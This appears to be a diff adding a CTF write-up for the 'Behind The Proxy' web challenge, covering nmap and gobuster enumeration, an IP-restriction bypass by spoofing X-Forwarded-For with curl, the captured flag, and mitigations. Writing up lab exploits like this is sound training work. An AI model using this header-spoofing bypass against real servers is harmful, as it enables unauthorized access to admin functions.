@@ -1,0 +1,169 @@
+Challenge-02
+
+Solving CTF Labs on ThunderCipher
+
+YUVARAJ M
+
+ThunderCipher – Behind The Proxy Writeup
+
+Difficulty: Easy
+Category: Web Exploitation
+Vulnerability: Improper Trust in Proxy Headers (IP-Based Access Control Bypass)
+Target IP: 192.168.5.247
+Port: 80
+
+Challenge Description
+
+Behind The Proxy is an easy web challenge where a web application is running on port 80.
+
+The page mentions that access is restricted to internal users only. The objective was to analyze how the server verifies internal access and determine whether the trust mechanism can be bypassed.
+
+The challenge hint suggests that sometimes servers trust what they shouldn’t.
+
+The goal was to gain internal access and retrieve the flag.
+
+Enumeration Phase
+Step 1 – Port Scanning
+
+Performed an nmap scan:
+
+nmap 192.168.5.247 -A
+Open ports found:
+
+22 (SSH – OpenSSH 9.9p1 Ubuntu)
+
+80 (HTTP – Apache 2.4.63)
+
+Service Info showed:
+
+Host: 127.0.0.1
+
+This suggested that the application might be running behind a reverse proxy and trusting forwarded headers.
+
+Application Analysis
+Step 2 – Directory Enumeration
+
+Used Gobuster to discover hidden endpoints:
+
+gobuster dir -u http://192.168.5.247 \
+-w /usr/share/wordlists/dirb/common.txt
+Discovered Endpoints:
+
+/index.php
+
+/admin.php
+
+/.htaccess (403)
+
+/.htpasswd (403)
+
+The interesting endpoint was:
+
+/admin.php
+Step 3 – Access Testing
+
+Accessing the admin page normally:
+
+curl -i http://192.168.5.247/admin.php
+
+Response:
+
+403 Forbidden
+Access to this resource is restricted.
+
+This indicated IP-based access control.
+
+Exploitation
+Step 4 – Testing Proxy Header Manipulation
+
+Since the challenge name was “Behind The Proxy”, the likely vulnerability was improper trust in proxy headers such as:
+
+X-Forwarded-For
+
+X-Real-IP
+
+Many applications check:
+
+if (client_ip == "127.0.0.1")
+
+Instead of validating the real source IP.
+
+Exploit Command
+
+Spoofed the internal IP using:
+
+curl -i http://192.168.5.247/admin.php \
+-H "X-Forwarded-For: 127.0.0.1"
+Successful Response
+
+The server responded with:
+
+Internal access verified.
+ThunderCipher{proxy_headers_are_not_authentication}
+Vulnerability Explanation
+Vulnerability – Improper Trust in Proxy Headers
+
+The server trusted the X-Forwarded-For header to determine whether the request originated from an internal IP address.
+
+However, this header is fully controllable by the client unless validated by a trusted reverse proxy.
+
+This is categorized under:
+
+Broken Access Control
+OWASP Top 10 – A01
+
+Impact
+
+• External users can gain internal access
+• Authentication bypass
+• Exposure of sensitive admin functionality
+• Information disclosure
+
+In a real-world scenario, this could lead to:
+
+• Admin panel compromise
+• Privilege escalation
+• Data breach
+• Full application takeover
+
+How to Fix
+Mitigation
+
+The correct implementation should:
+
+Option 1 – Use actual server IP information
+
+Use server-side variables that cannot be modified by the client:
+
+client_ip = request.remote_addr
+Option 2 – Trust proxy headers only from known proxies
+
+Only accept X-Forwarded-For if:
+
+The request comes from a trusted reverse proxy
+
+The proxy overwrites any client-supplied headers
+
+Never directly trust client-controlled headers for authentication decisions.
+
+Lessons Learned
+
+• Always enumerate hidden endpoints
+• If access is IP-restricted → test header spoofing
+• Proxy headers are common misconfigurations
+• Broken Access Control is extremely common
+• Small misconfigurations can completely break security
+
+Attack Flow Summary
+
+• Scanned target → Found port 80
+• Enumerated directories → Found /admin.php
+• Accessed page → Received 403 Forbidden
+• Identified possible IP restriction
+• Spoofed X-Forwarded-For: 127.0.0.1
+• Bypassed restriction
+• Retrieved flag
+
+Final Flag
+
+ThunderCipher{proxy_headers_are_not_authentication}
